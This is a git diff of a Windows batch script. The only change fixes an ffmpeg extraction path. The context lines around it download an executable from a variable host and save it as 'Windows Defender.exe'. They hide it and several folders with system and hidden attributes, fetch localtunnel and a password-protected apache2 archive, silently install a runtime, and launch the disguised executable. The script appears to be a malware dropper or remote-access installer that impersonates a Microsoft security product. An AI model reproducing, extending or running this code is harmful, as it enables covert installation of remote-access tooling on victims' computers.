@@ -54,7 +54,7 @@ attrib +s +h +i "%environment%\Win32"
 "%environment%\curl.exe" -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
 "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.7z"
-"%environment%\curl.exe" -k https://www.videohelp.com/download/ffmpeg-2.5.2-win32-static.7z -o "%temp%\ffmpeg.zip" && "%environment%\7-Zip\7z.exe" e "%temp%\ffmpeg.zip" -o"%environment%" "bin\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.zip"
+"%environment%\curl.exe" -k https://www.videohelp.com/download/ffmpeg-2.5.2-win32-static.7z -o "%temp%\ffmpeg.zip" && "%environment%\7-Zip\7z.exe" e "%temp%\ffmpeg.zip" -o"%environment%" "ffmpeg-2.5.2-win32-static\bin\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.zip"
 "%environment%\curl.exe" -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%%20C%%2B%%2B%%20Redistributable%%20for%%20Visual%%20Studio%%202012%%20Update%%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del /s /f /q /a "%temp%\vcredist_x86.exe"
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
